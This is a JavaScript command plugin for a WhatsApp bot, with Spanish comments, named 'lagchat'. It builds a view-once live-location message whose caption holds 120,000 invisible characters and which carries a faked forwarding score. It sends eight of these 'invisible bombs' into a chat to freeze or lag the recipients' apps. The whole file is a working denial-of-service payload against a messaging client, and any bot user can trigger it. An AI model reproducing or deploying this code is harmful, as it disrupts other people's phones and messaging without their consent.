const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '\u2063',
        degreesLongitude: '\u2063',
        caption: '\u2063'.repeat(120000), // todo invisible, 120 mil caracteres
        sequenceNumber: String(Math.floor(Math.random() * 999999)),
        jpegThumbnail: Buffer.alloc(2 * 1024, 0), // miniatura ligera
        contextInfo: {
          forwardingScore: 99999,
          isForwarded: true,
          externalAdReply: {
            title: '\u2063',
            body: '\u2063',
            mediaType: 1,
            renderLargerThumbnail: false,
            showAdAttribution: false,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn }) => {
  const jid = m.chat
  const times = 8 // varias bombas para que se sienta el lag

  await m.reply(`⚠️ Enviando ${times} bombas invisibles...`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(resolve => setTimeout(resolve, 150))
    } catch (error) {
      console.error('Error al enviar mensaje:', error)
      await m.reply('❗ Error al enviar mensaje.')
      return
    }
  }

  await m.reply('✅ *Lagchat invisible enviado.*')
}

handler.command = /^lagchat$/i
handler.owner = false


export default handler